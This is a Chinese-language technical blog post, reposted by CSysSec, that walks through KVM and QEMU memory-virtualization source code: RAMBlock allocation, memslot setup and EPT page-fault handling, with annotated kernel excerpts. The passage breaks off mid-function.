<p><strong>CSysSec注</strong>： 本KVM源码分析系列文章来自系Intel中国Linux内核与虚拟化开发工程师Oen Han的<a href="http://www.oenhan.com/kvm-src-4-mem" target="_blank" rel="external">博客</a>,Oen Han 在虚拟化领域有丰富的开发经验，其写的KVM源码分析系列是本人目前见过最好最详细的，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kvmsource-memory/" target="_blank" rel="external">KVM源码分析之内存虚拟化</a>》及原作者信息:<a href="http://www.oenhan.com/about" target="_blank" rel="external">Oen Han</a></p>
<hr>
<p>终于把<a href="http://www.csyssec.org/20170104/kvmsource-cpu/" target="_blank" rel="external">KVM源码分析之CPU虚拟化</a>写完了，虽然还有run的部分另外在写，还是先看一下内存虚拟化部分。</p>
<p>代码版本：<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git</a> v3.16.37</p>
<p>在<a href="http://www.csyssec.org/20170104/kvmsource-create/" target="_blank" rel="external">虚拟机的创建与运行中</a>pc_init_pci负责在qemu中初始化虚拟机，内存初始化也是在这里完成的，还是一步步从qemu说起，在vl.c的main函数中有ram_size参数，由qemu入参标识QEMU_OPTION_m设定，顾名思义就是虚拟机内存的大小，通过machine-&gt;init一步步传递给pc_init1函数。在这里分出了above_4g_mem_size和below_4g_mem_size，即高低端内存（也不一定是32bit机器..），然后开始初始化内存，即pc_memory_init，内存通过memory_region_init_ram下面的qemu_ram_alloc分配，使用qemu_ram_alloc_from_ptr。</p>
<p>插播qemu对内存条的模拟管理，是通过RAMBlock和ram_list管理的，RAMBlock就是每次申请的内存池，ram_list则是RAMBlock的链表，他们结构如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> RAMBlock &#123;</div><div class="line"><span class="comment">//对应宿主的内存地址</span></div><div class="line">    <span class="keyword">uint8_t</span> *host;</div><div class="line"><span class="comment">//block在ramlist中的偏移</span></div><div class="line">    <span class="keyword">ram_addr_t</span> offset;</div><div class="line"><span class="comment">//block长度</span></div><div class="line">    <span class="keyword">ram_addr_t</span> length;</div><div class="line">    <span class="keyword">uint32_t</span> flags;</div><div class="line"><span class="comment">//block名字</span></div><div class="line">    <span class="keyword">char</span> idstr[<span class="number">256</span>];</div><div class="line">    QLIST_ENTRY(RAMBlock) next;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__linux__) &amp;&amp; !defined(TARGET_S390X)</span></div><div class="line">    <span class="keyword">int</span> fd;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">&#125; RAMBlock;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> RAMList &#123;</div><div class="line"><span class="comment">//看代码理解就是list的head，但是不知道为啥叫dirty...</span></div><div class="line">    <span class="keyword">uint8_t</span> *phys_dirty;</div><div class="line">    QLIST_HEAD(ram, RAMBlock) blocks;</div><div class="line">&#125; RAMList;</div></pre></td></tr></table></figure>
<p>下面再回到qemu_ram_alloc_from_ptr函数，使用find_ram_offset赋值给new block的offset，find_ram_offset具体工作模型已经在<a href="http://www.csyssec.org/20170104/kvmsource-create/" target="_blank" rel="external">KVM源代码分析之虚拟机的创建与运行</a>中提到了，不赘述。然后是一串判断，在kvm_enabled的情况下使用new_block-&gt;host = kvm_vmalloc(size)，最终内存是qemu_vmalloc分配的，使用qemu_memalign干活。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">qemu_memalign</span><span class="params">(<span class="keyword">size_t</span> alignment, <span class="keyword">size_t</span> size)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">void</span> *ptr;</div><div class="line"><span class="comment">//使用posix进行内存针对页大小对齐</span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_POSIX_C_SOURCE) &amp;&amp; !defined(__sun__)</span></div><div class="line">    <span class="keyword">int</span> ret;</div><div class="line">    ret = posix_memalign(&amp;ptr, alignment, size);</div><div class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</div><div class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed to allocate %zu B: %sn"</span>,</div><div class="line">                size, strerror(ret));</div><div class="line">        <span class="built_in">abort</span>();</div><div class="line">    &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(CONFIG_BSD)</span></div><div class="line">    ptr = qemu_oom_check(valloc(size));</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"><span class="comment">//所谓检查oom就是看memalign对应malloc申请内存是否成功</span></div><div class="line">    ptr = qemu_oom_check(memalign(alignment, size));</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">    trace_qemu_memalign(alignment, size, ptr);</div><div class="line">    <span class="keyword">return</span> ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>以上qemu_vmalloc进行内存申请就结束了。在qemu_ram_alloc_from_ptr函数末尾则是将block添加到链表，realloc整个ramlist，用memset初始化整个ramblock，madvise对内存使用限定。<br>然后一层层的退回到pc_memory_init函数。</p>
<p>此时pc.ram已经分配完成，ram_addr已经拿到了分配的内存地址，MemoryRegion ram初始化完成。下面则是对已有的ram进行分段，即ram-below-4g和ram-above-4g，也就是高端内存和低端内存。用memory_region_init_alias初始化子MemoryRegion，然后将memory_region_add_subregion添加关联起来，memory_region_add_subregion具体细节“KVM源码分析2”中已经说了，参考对照着看吧，中间很多映射代码过程也只是qemu遗留的软件实现，没看到具体存在的意义，直接看到kvm_set_user_memory_region函数，内核真正需要kvm_vm_ioctl传递过去的参数是什么， struct kvm_userspace_memory_region mem而已，也就是</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> kvm_userspace_memory_region &#123;</div><div class="line">__u32 slot;</div><div class="line">__u32 flags;</div><div class="line">__u64 guest_phys_addr;</div><div class="line">__u64 memory_size; <span class="comment">/* bytes */</span></div><div class="line">__u64 userspace_addr; <span class="comment">/* start of the userspace allocated memory */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>kvm_vm_ioctl进入到内核是在KVM_SET_USER_MEMORY_REGION参数中，即执行kvm_vm_ioctl_set_memory_region，然后一直向下，到<strong>kvm_set_memory_region函数，check_memory_region_flags检查mem-&gt;flags是否合法，而当前flag也就使用了两位，KVM_MEM_LOG_DIRTY_PAGES和KVM_MEM_READONLY，从qemu传递过来只能是KVM_MEM_LOG_DIRTY_PAGES,下面是对mem中各参数的合规检查，(mem-&gt;memory_size &amp; (PAGE_SIZE – 1))要求以页为单位，(mem-&gt;guest_phys_addr &amp; (PAGE_SIZE – 1))要求guest_phys_addr页对齐，而((mem-&gt;userspace_addr &amp; (PAGE_SIZE – 1)) || !access_ok(VERIFY_WRITE,(void </strong>user *)(unsigned long)mem-&gt;userspace_addr,mem-&gt;memory_size))则保证host的线性地址页对齐而且该地址域有写权限。<br>id_to_memslot则是根据qemu的内存槽号得到kvm结构下的内存槽号，转换关系来自id_to_index数组，那映射关系怎么来的，映射关系是一一对应的，在kvm_create_vm虚拟机创建过程中，kvm_init_memslots_id初始化对应关系，即slots-&gt;id_to_index[i] = slots-&gt;memslots[i].id = i，当前映射是没有意义的，估计是为了后续扩展而存在的。<br>扩充了new的kvm_memory_slot，下面直接在代码中注释更方便：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">//映射内存有大小，不是删除内存条</span></div><div class="line"><span class="keyword">if</span> (npages) &#123;</div><div class="line"><span class="comment">//内存槽号没有虚拟内存条，意味内存新创建</span></div><div class="line">	<span class="keyword">if</span> (!old.npages)</div><div class="line">		change = KVM_MR_CREATE;</div><div class="line">	<span class="keyword">else</span> &#123; <span class="comment">/* Modify an existing slot. */</span></div><div class="line"><span class="comment">//修改已存在的内存修改标志或者平移映射地址</span></div><div class="line"><span class="comment">//下面是不能处理的状态（内存条大小不能变，物理地址不能变，不能修改只读）</span></div><div class="line">		<span class="keyword">if</span> ((mem-&gt;userspace_addr != old.userspace_addr) ||</div><div class="line">		    (npages != old.npages) ||</div><div class="line">		    ((<span class="keyword">new</span>.flags ^ old.flags) &amp; KVM_MEM_READONLY))</div><div class="line">			<span class="keyword">goto</span> out;</div><div class="line"><span class="comment">//guest地址不同，内存条平移</span></div><div class="line">		<span class="keyword">if</span> (base_gfn != old.base_gfn)</div><div class="line">			change = KVM_MR_MOVE;</div><div class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">new</span>.flags != old.flags)</div><div class="line"><span class="comment">//修改属性</span></div><div class="line">			change = KVM_MR_FLAGS_ONLY;</div><div class="line">		<span class="keyword">else</span> &#123; <span class="comment">/* Nothing to change. */</span></div><div class="line">			r = <span class="number">0</span>;</div><div class="line">			<span class="keyword">goto</span> out;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (old.npages) &#123;</div><div class="line"><span class="comment">//申请插入的内存为0，而内存槽上有内存，意味删除</span></div><div class="line">	change = KVM_MR_DELETE;</div><div class="line">&#125; <span class="keyword">else</span> <span class="comment">/* Modify a non-existent slot: disallowed. */</span></div><div class="line">	<span class="keyword">goto</span> out;</div></pre></td></tr></table></figure>
<p>另外看kvm_mr_change就知道memslot的变动值了：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">enum</span> kvm_mr_change &#123;</div><div class="line">	KVM_MR_CREATE,</div><div class="line">	KVM_MR_DELETE,</div><div class="line">	KVM_MR_MOVE,</div><div class="line">	KVM_MR_FLAGS_ONLY,</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>在往下是一段检查</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ((change == KVM_MR_CREATE) || (change == KVM_MR_MOVE)) &#123;</div><div class="line">	<span class="comment">/* Check for overlaps */</span></div><div class="line">	r = -EEXIST;</div><div class="line">	kvm_for_each_memslot(slot, kvm-&gt;memslots) &#123;</div><div class="line">		<span class="keyword">if</span> ((slot-&gt;id &gt;= KVM_USER_MEM_SLOTS) ||</div><div class="line"><span class="comment">//下面排除掉准备操作的内存条，在KVM_MR_MOVE中是有交集的</span></div><div class="line">		    (slot-&gt;id == mem-&gt;slot))</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line"><span class="comment">//下面就是当前已有的slot与new在guest线性区间上有交集</span></div><div class="line">		<span class="keyword">if</span> (!((base_gfn + npages &lt;= slot-&gt;base_gfn) ||</div><div class="line">		      (base_gfn &gt;= slot-&gt;base_gfn + slot-&gt;npages)))</div><div class="line">			<span class="keyword">goto</span> out;</div><div class="line"><span class="comment">//out错误码就是EEXIST</span></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果是新插入内存条，代码则走入kvm_arch_create_memslot函数，里面主要是一个循环，KVM_NR_PAGE_SIZES是分页的级数，此处是3，第一次循环，lpages = gfn_to_index(slot-&gt;base_gfn + npages – 1,slot-&gt;base_gfn, level) + 1，lpages就是一级页表所需要的page数，大致是npages&gt;&gt;0<em>9,然后为slot-&gt;arch.rmap[i]申请了内存空间，此处可以猜想，rmap就是一级页表了，继续看，lpages约为npages&gt;&gt;1</em>9,此处又多为lpage_info申请了同等空间，然后对lpage_info初始化赋值，现在看不到lpage_info的具体作用，看到后再补上。整体上看kvm_arch_create_memslot做了一个3级的软件页表。<br>如果有脏页,并且脏页位图为空,则分配脏页位图, kvm_create_dirty_bitmap实际就是”页数/8″.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ((<span class="keyword">new</span>.flags &amp; KVM_MEM_LOG_DIRTY_PAGES) &amp;&amp; !<span class="keyword">new</span>.dirty_bitmap) &#123;</div><div class="line">		<span class="keyword">if</span> (kvm_create_dirty_bitmap(&amp;<span class="keyword">new</span>) &lt; <span class="number">0</span>)</div><div class="line">			<span class="keyword">goto</span> out_free;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>当内存条的改变是KVM_MR_DELETE或者KVM_MR_MOVE,先申请一个slots,把kvm-&gt;memslots暂存到这里,首先通过id_to_memslot获取准备插入的内存条对应到kvm的插槽是slot,无论删除还是移动,将其先标记为KVM_MEMSLOT_INVALID,然后是install_new_memslots,其实就是更新了一下slots-&gt;generation的值。</p>
<p>内存的添加说完了，看一下EPT页表的映射，在kvm_arch_vcpu_setup中有kvm_mmu_setup，是mmu的初始化，EPT的初始化是init_kvm_tdp_mmu，所谓的初始化就是填充了vcpu-&gt;arch.mmu结构体，里面有很多回调函数都会用到，最终的是tdp_page_fault。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">context-&amp;gt;page_fault = tdp_page_fault;</div><div class="line">context-&amp;gt;sync_page = nonpaging_sync_page;</div><div class="line">context-&amp;gt;invlpg = nonpaging_invlpg;</div><div class="line">context-&amp;gt;update_pte = nonpaging_update_pte;</div><div class="line">context-&amp;gt;shadow_root_level = kvm_x86_ops-&amp;gt;get_tdp_level();</div><div class="line">context-&amp;gt;root_hpa = INVALID_PAGE;</div><div class="line">context-&amp;gt;direct_map = <span class="literal">true</span>;</div><div class="line">context-&amp;gt;set_cr3 = kvm_x86_ops-&amp;gt;set_tdp_cr3;</div><div class="line">context-&amp;gt;get_cr3 = get_cr3;</div><div class="line">context-&amp;gt;get_pdptr = kvm_pdptr_read;</div><div class="line">context-&amp;gt;inject_page_fault = kvm_inject_page_fault;</div></pre></td></tr></table></figure>
<p>当guest访问物理内存时发生vm-exit，进入vmx_handle_exit函数，根据EXIT_REASON_EPT_VIOLATION走到handle_ept_violation函数，exit_qualification = vmcs_readl(EXIT_QUALIFICATION)获取vm-exit的退出原因，进入kvm_mmu_page_fault函数：vcpu-&gt;arch.mmu.page_fault(vcpu, cr2, error_code, false)，即是tdp_page_fault，handle_mmio_page_fault的流程不提。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//填充kvm mmu专用的slab </span></div><div class="line">r = mmu_topup_memory_caches(vcpu);</div><div class="line"><span class="comment">//获取gfn使用的level，即hugepage的问题</span></div><div class="line">force_pt_level = mapping_level_dirty_bitmap(vcpu, gfn);</div><div class="line"><span class="keyword">if</span> (likely(!force_pt_level)) &#123;</div><div class="line">	level = mapping_level(vcpu, gfn);</div><div class="line">	gfn &amp;amp;= ~(KVM_PAGES_PER_HPAGE(level) - <span class="number">1</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line">	level = PT_PAGE_TABLE_LEVEL;</div><div class="line"></div><div class="line"><span class="comment">//顾名思义，快速处理一个简单的page fault</span></div><div class="line"><span class="comment">//即present同时有写权限的非mmio page fault</span></div><div class="line"><span class="comment">//参考page_fault_can_be_fast函数</span></div><div class="line"><span class="comment">//一部分处理没有写权限的page fault</span></div><div class="line"><span class="comment">//一部分处理 TLB lazy</span></div><div class="line"><span class="comment">//fast_pf_fix_direct_spte也就是将pte获取的写权限</span></div><div class="line"><span class="keyword">if</span> (fast_page_fault(vcpu, gpa, level, error_code))</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="comment">//下面函数主要就一件事情，gfn_to_pfn</span></div><div class="line"><span class="keyword">if</span> (try_async_pf(vcpu, prefault, gfn, gpa, &amp;amp;pfn, write, &amp;amp;map_writable))</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="comment">//direct map就是映射ept页表的过程</span></div><div class="line">r = __direct_map(vcpu, gpa, write, map_writable,</div><div class="line">      level, gfn, pfn, prefault);</div></pre></td></tr></table></figure>
<p>在try_async_pf中就是gfn转换成hva，然后hva转换成pfn的过程，gfn转换到hva:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">pfn_t</span></div><div class="line">__gfn_to_pfn_memslot(<span class="keyword">struct</span> kvm_memory_slot *slot, <span class="keyword">gfn_t</span> gfn, <span class="keyword">bool</span> atomic,</div><div class="line">		     <span class="keyword">bool</span> *async, <span class="keyword">bool</span> write_fault, <span class="keyword">bool</span> *writable)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr = __gfn_to_hva_many(slot, gfn, <span class="literal">NULL</span>, write_fault);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (addr == KVM_HVA_ERR_RO_BAD)</div><div class="line">		<span class="keyword">return</span> KVM_PFN_ERR_RO_FAULT;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (kvm_is_error_hva(addr))</div><div class="line">		<span class="keyword">return</span> KVM_PFN_NOSLOT;</div><div class="line"></div><div class="line">	<span class="comment">/* Do not map writable pfn in the readonly memslot. */</span></div><div class="line">	<span class="keyword">if</span> (writable &amp;amp;&amp;amp; memslot_is_readonly(slot)) &#123;</div><div class="line">		*writable = <span class="literal">false</span>;</div><div class="line">		writable = <span class="literal">NULL</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> hva_to_pfn(addr, atomic, async, write_fault,</div><div class="line">			  writable);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>gfn2hva本质就是</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span></div><div class="line">__gfn_to_hva_memslot(<span class="keyword">struct</span> kvm_memory_slot *slot, <span class="keyword">gfn_t</span> gfn)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">return</span> slot-&amp;gt;userspace_addr + (gfn - slot-&amp;gt;base_gfn) * PAGE_SIZE;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>而hva_to_pfn则就是host的线性区进行地址转换的问题了，不提。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> __direct_map(<span class="keyword">struct</span> kvm_vcpu *vcpu, <span class="keyword">gpa_t</span> v, <span class="keyword">int</span> write,</div><div class="line">			<span class="keyword">int</span> map_writable, <span class="keyword">int</span> level, <span class="keyword">gfn_t</span> gfn, <span class="keyword">pfn_t</span> pfn,</div><div class="line">			<span class="keyword">bool</span> prefault)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> kvm_shadow_walk_iterator iterator;</div><div class="line">	<span class="keyword">struct</span> kvm_mmu_page *sp;</div><div class="line">	<span class="keyword">int</span> emulate = <span class="number">0</span>;</div><div class="line">	<span class="keyword">gfn_t</span> pseudo_gfn;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (!VALID_PAGE(vcpu-&gt;arch.mmu.root_hpa))</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="comment">//遍历ept四级页表</span></div><div class="line">	for_each_shadow_entry(vcpu, (u64)gfn &lt;&lt; PAGE_SHIFT, iterator) &#123;</div><div class="line"><span class="comment">//如果是最后一级，level是hugepage下的level</span></div><div class="line">		<span class="keyword">if</span> (iterator.level == level) &#123;</div><div class="line"><span class="comment">//设置pte，页表下一级的page地址就是pfn写入到pte</span></div><div class="line">			mmu_set_spte(vcpu, iterator.sptep, ACC_ALL,</div><div class="line">				     write, &amp;emulate, level, gfn, pfn,</div><div class="line">				     prefault, map_writable);</div><div class="line">			direct_pte_prefetch(vcpu, iterator.sptep);</div><div class="line">			++vcpu-&gt;stat.pf_fixed;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		drop_large_spte(vcpu, iterator.sptep);</div><div class="line"><span class="comment">//mmu page不在位的情况，也就是缺页</span></div><div class="line">		<span class="keyword">if</span> (!is_shadow_present_pte(*iterator.sptep)) &#123;</div><div class="line">			u64 base_addr = iterator.addr;</div><div class="line"><span class="comment">//获取指向的具体mmu page entry的index</span></div><div class="line">			base_addr &amp;= PT64_LVL_ADDR_MASK(iterator.level);</div><div class="line">			pseudo_gfn = base_addr &gt;&gt; PAGE_SHIFT;</div><div class="line"><span class="comment">//获取mmu page</span></div><div class="line">			sp = kvm_mmu_get_page(vcpu, pseudo_gfn, iterator.addr,</div><div class="line">					      iterator.level - <span class="number">1</span>,</div><div class="line">					      <span class="number">1</span>, ACC_ALL, iterator.sptep);</div><div class="line"><span class="comment">//将当前的mmu page的地址写入到上一级别mmu page的pte中</span></div><div class="line">			link_shadow_page(iterator.sptep, sp, <span class="literal">true</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> emulate;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">struct</span> kvm_mmu_page *<span class="title">kvm_mmu_get_page</span><span class="params">(<span class="keyword">struct</span> kvm_vcpu *vcpu,</span></span></div><div class="line">					     <span class="keyword">gfn_t</span> gfn,</div><div class="line">					     <span class="keyword">gva_t</span> gaddr,</div><div class="line">					     <span class="keyword">unsigned</span> level,</div><div class="line">					     <span class="keyword">int</span> direct,</div><div class="line">					     <span class="keyword">unsigned</span> access,</div><div class="line">					     u64 *parent_pte)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">union</span> kvm_mmu_page_role role;</div><div class="line">	<span class="keyword">unsigned</span> quadrant;</div><div class="line">	<span class="keyword">struct</span> kvm_mmu_page *sp;</div><div class="line">	<span class="keyword">bool</span> need_sync = <span class="literal">false</span>;</div><div class="line"></div><div class="line">	role = vcpu-&gt;arch.mmu.base_role;</div><div class="line">	role.level = level;</div><div class="line">	role.direct = direct;</div><div class="line">	<span class="keyword">if</span> (role.direct)</div><div class="line">		role.cr4_pae = <span class="number">0</span>;</div><div class="line">	role.access = access;</div><div class="line">	<span class="keyword">if</span> (!vcpu-&gt;arch.mmu.direct_map</div><div class="line">	    &amp;&amp; vcpu-&gt;arch.mmu.root_level &lt;= PT32_ROOT_LEVEL) &#123;</div><div class="line">		quadrant = gaddr &gt;&gt; (PAGE_SHIFT + (PT64_PT_BITS * level));</div><div class="line">		quadrant &amp;= (<span class="number">1</span> &lt;&lt; ((PT32_PT_BITS - PT64_PT_BITS) * level)) - <span class="number">1</span>;</div><div class="line">		role.quadrant = quadrant;</div><div class="line">	&#125;</div><div class="line"><span class="comment">//根据一个hash索引来的</span></div><div class="line">	for_each_gfn_sp(vcpu-&gt;kvm, sp, gfn) &#123;</div><div class="line"><span class="comment">//检查整个mmu ept是否被失效了</span></div><div class="line">		<span class="keyword">if</span> (is_obsolete_sp(vcpu-&gt;kvm, sp))</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (!need_sync &amp;&amp; sp-&gt;unsync)</div><div class="line">			need_sync = <span class="literal">true</span>;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (sp-&gt;role.word != role.word)</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (sp-&gt;unsync &amp;&amp; kvm_sync_page_transient(vcpu, sp))</div><div class="line">			<span class="keyword">break</span>;</div><div class="line"></div><div class="line">		mmu_page_add_parent_pte(vcpu, sp, parent_pte);</div><div class="line">		<span class="keyword">if</span> (sp-&gt;unsync_children) &#123;</div><div class="line">			kvm_make_request(KVM_REQ_MMU_SYNC, vcpu);</div><div class="line">			kvm_mmu_mark_parents_unsync(sp);</div><div class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (sp-&gt;unsync)</div><div class="line">			kvm_mmu_mark_parents_unsync(sp);</div><div class="line"></div><div class="line">		__clear_sp_write_flooding_count(sp);</div><div class="line">		trace_kvm_mmu_get_page(sp, <span class="literal">false</span>);</div><div class="line">		<span class="keyword">return</span> sp;</div><div class="line">	&#125;</div><div class="line">	++vcpu-&gt;kvm-&gt;stat.mmu_cache_miss;</div><div class="line">	sp = kvm_mmu_alloc_page(vcpu, parent_pte, direct);</div><div class="line">	<span class="keyword">if</span> (!sp)</div><div class="line">		<span class="keyword">return</span> sp;</div><div class="line">	sp-&gt;gfn = gfn;</div><div class="line">	sp-&gt;role = role;</div><div class="line"><span class="comment">//新的mmu 